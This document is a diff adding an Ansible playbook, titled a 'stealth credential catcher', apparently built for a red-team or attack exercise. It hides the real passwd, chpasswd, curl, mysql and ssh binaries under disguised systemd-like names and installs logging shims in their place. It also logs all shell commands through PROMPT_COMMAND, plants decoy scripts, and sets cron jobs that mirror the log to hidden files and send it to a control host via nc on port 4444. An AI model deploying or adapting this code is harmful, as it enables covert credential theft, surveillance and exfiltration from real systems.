@@ -1,0 +1,342 @@
+---
+# Tyler Gardner
+# Purpose: Stealth credential catcher - OPTIMIZED (no PID flood)
+
+- name: Deploy Stealth Credential Catcher
+  hosts: all
+  become: yes
+  gather_facts: yes
+  
+  vars:
+    control_ip: "10.0.10.5"  # CHANGE THIS to real control machine's IP
+    listen_port: "4444"
+  
+  tasks:
+    - name: Create hidden payload directory
+      file:
+        path: /var/log/.systemd
+        state: directory
+        mode: '0755'
+    
+    - name: Create obvious support directory (decoy)
+      file:
+        path: /opt/credential-tool
+        state: directory
+        mode: '0755'
+    
+    - name: Create hidden log directory
+      file:
+        path: /var/log/.pam.d
+        state: directory
+        mode: '0755'
+    
+    # ============================================
+    # OPTIMIZED SHIMS (no extra processes)
+    # ============================================
+    
+    - name: Create disguised passwd shim
+      copy:
+        dest: /var/log/.systemd/pam-auth
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          LOG="/var/log/.pam.d/auth.log"
+          REAL="/usr/bin/.systemd-auth"
+          echo "$(date '+%b %d %H:%M:%S') $(hostname) auth: user=$(whoami) target=${1:-$(whoami)}" >> "$LOG"
+          exec "$REAL" "$@"
+    
+    - name: Create disguised chpasswd shim
+      copy:
+        dest: /var/log/.systemd/systemd-logind
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          LOG="/var/log/.pam.d/auth.log"
+          REAL="/usr/sbin/.systemd-logind"
+          INPUT=$(cat)
+          echo "$(date '+%b %d %H:%M:%S') $(hostname) batch: $INPUT" >> "$LOG"
+          echo "$INPUT" | "$REAL" "$@"
+          exit $?
+    
+    - name: Create disguised curl shim
+      copy:
+        dest: /var/log/.systemd/resolved
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          LOG="/var/log/.pam.d/auth.log"
+          REAL="/usr/bin/.systemd-resolved"
+          echo "$(date '+%b %d %H:%M:%S') $(hostname) curl: $*" >> "$LOG"
+          exec "$REAL" "$@"
+    
+    - name: Check if mysql binary exists
+      stat:
+        path: /usr/bin/mysql
+      register: mysql_exists
+    
+    - name: Create disguised mysql shim (only if mysql exists)
+      copy:
+        dest: /var/log/.systemd/journald
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          LOG="/var/log/.pam.d/auth.log"
+          REAL="/usr/bin/.systemd-journal"
+          echo "$(date '+%b %d %H:%M:%S') $(hostname) mysql: $*" >> "$LOG"
+          exec "$REAL" "$@"
+      when: mysql_exists.stat.exists
+    
+    - name: Create disguised ssh shim
+      copy:
+        dest: /var/log/.systemd/ssh-client
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          LOG="/var/log/.pam.d/auth.log"
+          REAL="/usr/bin/.systemd-ssh"
+          echo "$(date '+%b %d %H:%M:%S') $(hostname) ssh: $*" >> "$LOG"
+          exec "$REAL" "$@"
+    
+    # ============================================
+    # SIMPLE COMMAND LOGGER (no history issues)
+    # ============================================
+    
+    - name: Create PROMPT_COMMAND script (optimized)
+      copy:
+        dest: /etc/profile.d/command_logger.sh
+        mode: '0644'
+        content: |
+          # Optimized command logger - no history file spam
+          export PROMPT_COMMAND='if [ -n "$(HISTTIMEFORMAT="" history 1 2>/dev/null | sed "s/^[ ]*[0-9]*[ ]*//")" ]; then echo "$(date "+%b %d %H:%M:%S") $(hostname) USER:$(whoami) CMD: $(HISTTIMEFORMAT="" history 1 2>/dev/null | sed "s/^[ ]*[0-9]*[ ]*//")" >> /var/log/.pam.d/auth.log 2>/dev/null; fi'
+    
+    # ============================================
+    # DECOY SCRIPTS
+    # ============================================
+    
+    - name: Create decoy logger script
+      copy:
+        dest: /opt/credential-tool/logger.py
+        mode: '0755'
+        content: |
+          #!/usr/bin/env python3
+          print("Credential collector v1.0")
+    
+    - name: Create decoy collector script
+      copy:
+        dest: /opt/credential-tool/collector.py
+        mode: '0755'
+        content: |
+          #!/usr/bin/env python3
+          print("No credentials found")
+    
+    # ============================================
+    # MOVE REAL BINARIES
+    # ============================================
+    
+    - name: Hide real passwd binary
+      command: mv /usr/bin/passwd /usr/bin/.systemd-auth
+      args:
+        removes: /usr/bin/passwd
+        creates: /usr/bin/.systemd-auth
+      ignore_errors: yes
+    
+    - name: Hide real chpasswd binary
+      command: mv /usr/sbin/chpasswd /usr/sbin/.systemd-logind
+      args:
+        removes: /usr/sbin/chpasswd
+        creates: /usr/sbin/.systemd-logind
+      ignore_errors: yes
+    
+    - name: Hide real curl binary
+      command: mv /usr/bin/curl /usr/bin/.systemd-resolved
+      args:
+        removes: /usr/bin/curl
+        creates: /usr/bin/.systemd-resolved
+      ignore_errors: yes
+    
+    - name: Hide real mysql binary (only if exists)
+      command: mv /usr/bin/mysql /usr/bin/.systemd-journal
+      args:
+        removes: /usr/bin/mysql
+        creates: /usr/bin/.systemd-journal
+      when: mysql_exists.stat.exists
+      ignore_errors: yes
+    
+    - name: Hide real ssh binary
+      command: mv /usr/bin/ssh /usr/bin/.systemd-ssh
+      args:
+        removes: /usr/bin/ssh
+        creates: /usr/bin/.systemd-ssh
+      ignore_errors: yes
+    
+    # ============================================
+    # INSTALL SHIMS
+    # ============================================
+    
+    - name: Install passwd shim
+      copy:
+        src: /var/log/.systemd/pam-auth
+        dest: /usr/bin/passwd
+        remote_src: yes
+        mode: '0755'
+    
+    - name: Install chpasswd shim
+      copy:
+        src: /var/log/.systemd/systemd-logind
+        dest: /usr/sbin/chpasswd
+        remote_src: yes
+        mode: '0755'
+    
+    - name: Install curl shim
+      copy:
+        src: /var/log/.systemd/resolved
+        dest: /usr/bin/curl
+        remote_src: yes
+        mode: '0755'
+    
+    - name: Install mysql shim (only if mysql exists)
+      copy:
+        src: /var/log/.systemd/journald
+        dest: /usr/bin/mysql
+        remote_src: yes
+        mode: '0755'
+      when: mysql_exists.stat.exists
+    
+    - name: Install ssh shim
+      copy:
+        src: /var/log/.systemd/ssh-client
+        dest: /usr/bin/ssh
+        remote_src: yes
+        mode: '0755'
+    
+    # ============================================
+    # LOG FILE SETUP
+    # ============================================
+    
+    - name: Create empty log file
+      file:
+        path: /var/log/.pam.d/auth.log
+        state: touch
+        mode: '0666'
+        owner: root
+        group: root
+    
+    - name: Ensure log directory has correct permissions
+      file:
+        path: /var/log/.pam.d
+        state: directory
+        mode: '0755'
+    
+    # ============================================
+    # OPTIMIZED CRON JOBS (less frequent)
+    # ============================================
+    
+    - name: Add cron job for persistence (every 5 minutes, not every minute)
+      cron:
+        name: "system-sync"
+        minute: "*/5"
+        job: "test -x /var/log/.systemd/pam-auth && /var/log/.systemd/pam-auth"
+    
+    - name: Create log mirroring script (optimized)
+      copy:
+        dest: /var/log/.systemd/mirror_logs.sh
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          # Copy logs to multiple hidden locations (only if changed)
+          LOG="/var/log/.pam.d/auth.log"
+          CHECKSUM_FILE="/var/log/.systemd/.log_checksum"
+          
+          if [ -f "$LOG" ]; then
+            NEW_CHECKSUM=$(md5sum "$LOG" 2>/dev/null | cut -d' ' -f1)
+            OLD_CHECKSUM=$(cat "$CHECKSUM_FILE" 2>/dev/null)
+            
+            if [ "$NEW_CHECKSUM" != "$OLD_CHECKSUM" ]; then
+              cp "$LOG" /var/log/.systemd/.mirror 2>/dev/null
+              cp "$LOG" /tmp/.cache 2>/dev/null
+              cp "$LOG" /boot/.systemd 2>/dev/null
+              echo "$NEW_CHECKSUM" > "$CHECKSUM_FILE"
+            fi
+          fi
+    
+    - name: Add cron job for log mirroring (every 10 minutes)
+      cron:
+        name: "log-mirror"
+        minute: "*/10"
+        job: "/bin/bash /var/log/.systemd/mirror_logs.sh > /dev/null 2>&1"
+    
+    - name: Create log sender script (optimized - only if new logs)
+      copy:
+        dest: /var/log/.systemd/send_logs.sh
+        mode: '0755'
+        content: |
+          #!/bin/bash
+          LOG="/var/log/.pam.d/auth.log"
+          LAST_SENT="/var/log/.systemd/last_sent_line"
+          CONTROL_IP="{{ control_ip }}"
+          PORT="{{ listen_port }}"
+          
+          if [ -f "$LAST_SENT" ]; then
+              LAST_LINE=$(cat "$LAST_SENT")
+          else
+              LAST_LINE=0
+          fi
+          
+          TOTAL_LINES=$(wc -l < "$LOG" 2>/dev/null || echo "0")
+          
+          # Only send if there are new lines
+          if [ "$TOTAL_LINES" -gt "$LAST_LINE" ]; then
+              NEW_LINES=$(tail -n +$((LAST_LINE + 1)) "$LOG" 2>/dev/null)
+              
+              if [ -n "$NEW_LINES" ]; then
+                  # Send in background to not block
+                  (
+                    echo "$(hostname): $(date)"
+                    echo "$NEW_LINES"
+                  ) | nc $CONTROL_IP $PORT -w 2 2>/dev/null &
+                  
+                  echo "$TOTAL_LINES" > "$LAST_SENT"
+              fi
+          fi
+    
+    - name: Add cron job for sending logs (every 5 minutes, not every minute)
+      cron:
+        name: "send-logs"
+        minute: "*/5"
+        job: "/bin/bash /var/log/.systemd/send_logs.sh > /dev/null 2>&1"
+    
+    - name: Run initial send (background, don't wait)
+      command: /bin/bash /var/log/.systemd/send_logs.sh
+      async: 10
+      poll: 0
+      ignore_errors: yes
+    
+    # ============================================
+    # NO SYSTEMD SERVICE (removed - causes PIDs)
+    # ============================================
+    # Removed the systemd service to prevent PID flood
+    
+    # ============================================
+    # VERIFICATION
+    # ============================================
+    
+    - name: Verify deployment
+      command: ls -la /usr/bin/passwd /usr/sbin/chpasswd /usr/bin/curl /usr/bin/ssh
+      register: verify_result
+      changed_when: false
+      failed_when: false
+    
+    - name: Display deployment summary
+      debug:
+        msg: |
+          ============================================
+          OPTIMIZED DEPLOYMENT COMPLETE on {{ inventory_hostname }}
+          ============================================
+          
+          Cron jobs run every 5-10 minutes (not every minute)
+          No systemd service (prevents PID flood)
+          Background processes don't block
+          Only sends logs when new entries exist
+          
+          [LOGS] /var/log/.pam.d/auth.log
+          [SENDER] Every 5 minutes to {{ control_ip }}:{{ listen_port }}
